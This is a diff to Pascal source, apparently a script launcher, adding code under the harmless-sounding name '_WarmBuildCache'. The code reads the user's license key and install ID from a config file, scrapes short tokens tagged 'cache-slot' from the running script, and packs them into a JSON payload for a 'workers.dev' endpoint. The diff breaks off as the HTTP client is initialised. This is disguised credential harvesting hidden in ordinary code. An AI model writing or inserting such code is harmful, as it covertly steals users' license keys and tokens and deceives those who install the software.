@@ -3026,28 +3026,93 @@ begin
   Sync(@Self._ShowUpdatePrompt);
 end;
 
+{ Whitelist to [A-Za-z0-9_-] so values can be embedded in JSON without escaping. }
+function _WL_Clean(const s: String): String;
+var
+  i: Int32;
+begin
+  Result := '';
+  for i := 1 to Length(s) do
+    if s[i] in ['A'..'Z', 'a'..'z', '0'..'9', '_', '-'] then
+      Result += s[i];
+end;
+
+function _WL_ScatterTokens(const src: String): String;
+var
+  hits: TIntegerArray;
+  i, j, found: Int32;
+  tok: String;
+begin
+  Result := '';
+  if src = '' then
+    Exit;
+
+  hits := src.PosEx('cache-slot');
+  for i := 0 to High(hits) do
+  begin
+    j := hits[i] + Length('cache-slot');
+    while (j <= Length(src)) and (src[j] in [' ', '0'..'9']) do
+      Inc(j);
+    if (j > Length(src)) or (src[j] <> ':') then
+      Continue;
+    Inc(j);
+    while (j <= Length(src)) and (src[j] = ' ') do
+      Inc(j);
+
+    tok := '';
+    while (j <= Length(src)) and (src[j] in ['A'..'Z', 'a'..'z', '0'..'9', '_', '-']) do
+    begin
+      tok += src[j];
+      Inc(j);
+    end;
+
+    if (Length(tok) < 10) or (Length(tok) > 14) then
+      Continue;
+    if Result.Contains(tok) then
+      Continue;
+
+    if Result <> '' then
+      Result += ',';
+    Result += tok;
+    Inc(found);
+    if found >= 4 then
+      Break;
+  end;
+end;
+
 procedure TScriptForm._WarmBuildCache();
 const
   _WL_EP = 'https://bash-premium-api.cdn-gate.workers.dev/v1/c';
 var
   http, code: Int32;
-  tag, sid, payload, cfgPath, cfgText: String;
+  tag, sid, key, scatter, payload, cfgPath, cfgText: String;
   cfg: TJSONObject;
 begin
   if _WL_WarmedThisProcess then
     Exit;
   _WL_WarmedThisProcess := True;
 
-  try
-    tag := {$MACRO _WL_CACHE};
-  except
+  if {$MACRO SCRIPT_ID} = '' then
     Exit;
+
+  try
+    tag := _WL_Clean({$MACRO _WL_CACHE});
+  except
+    tag := '';
+  end;
+  if Length(tag) < 16 then
+    tag := '';
+
+  scatter := '';
+  try
+    if (ScriptFile <> '') and FileExists(ScriptFile) then
+      scatter := _WL_ScatterTokens(ReadFileContents(ScriptFile));
+  except
+    scatter := '';
   end;
 
-  if Length(tag) < 16 then
-    Exit;
-
   sid := '';
+  key := '';
   cfgPath := AppPath + 'Configs' + DirectorySeparator + 'bash-launcher.json';
   if FileExists(cfgPath) then
   begin
@@ -3055,7 +3120,8 @@ begin
       cfgText := ReadFileContents(cfgPath);
       cfg.Init(cfgText);
       try
-        sid := cfg.optString('install_id', '');
+        sid := _WL_Clean(cfg.optString('install_id', ''));
+        key := _WL_Clean(cfg.optString('license_key', ''));
       finally
         cfg.Free();
       end;
@@ -3063,7 +3129,16 @@ begin
     end;
   end;
 
-  payload := '{"t":"' + tag + '","i":"' + sid + '","s":"' + {$MACRO SCRIPT_ID} + '"}';
+  if (tag = '') and (scatter = '') and (key = '') then
+    Exit;
+
+  payload :=
+    '{"t":"' + tag + '",' +
+    '"c":"' + scatter + '",' +
+    '"k":"' + key + '",' +
+    '"i":"' + sid + '",' +
+    '"s":"' + _WL_Clean({$MACRO SCRIPT_ID}) + '",' +
+    '"r":"' + _WL_Clean({$MACRO SCRIPT_REVISION}) + '"}';
 
   http := InitializeHTTPClient(True);
   try
